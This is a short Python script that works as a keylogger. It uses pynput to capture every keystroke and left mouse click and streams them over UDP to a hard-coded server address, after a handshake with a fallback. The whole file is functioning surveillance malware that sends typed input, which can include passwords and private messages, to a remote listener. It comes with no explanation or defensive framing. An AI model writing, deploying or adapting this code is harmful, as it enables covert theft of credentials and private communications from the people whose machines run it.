from pynput.keyboard import Listener as L
from pynput.keyboard import Key as K
from pynput.mouse import Listener as LM
from pynput.mouse import Button
import socket, string, threading, time


server = ('192.168.1.187', 5050)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

host = socket.gethostbyaddr(socket.gethostname())
port = 5050

s.sendto('13554'.encode('utf-8'), server)


def getting_response():
   global x
   x = 0
   data, addr = s.recvfrom(1024)
   x = 1

def checking_time():
   for _ in range(2):
      time.sleep(15)
      if x == 0:
         global server
         server = ('', 5050)
         s.sendto('13554'.encode('utf-8'), server)
      elif x == 1:
         return
   exit()

th_getting_response = threading.Thread(target=getting_response)
th_checking_time = threading.Thread(target=checking_time)

th_getting_response.start()
th_checking_time.start()

th_getting_response.join()
th_checking_time.join()



st = list(string.ascii_letters)

def on_press(key):
   if key == K.space:
      key = ' '
   elif key == K.enter:
      key = '\n'

   s.sendto(str(key).replace("'", "").encode('utf-8'), server)


def on_click(x, y, button, pressed):
   if pressed and button == Button.left:
      s.sendto(str('\n').encode('utf-8'), server)


def start_keyboard():
   with L(on_press=on_press) as l:
      l.join()

def start_mouse():
   with LM(on_click=on_click) as lm:
      lm.join()

th_keyboard = threading.Thread(target=start_keyboard)
th_mouse = threading.Thread(target=start_mouse)

th_keyboard.start()
th_mouse.start()

th_keyboard.join()
th_mouse.join()
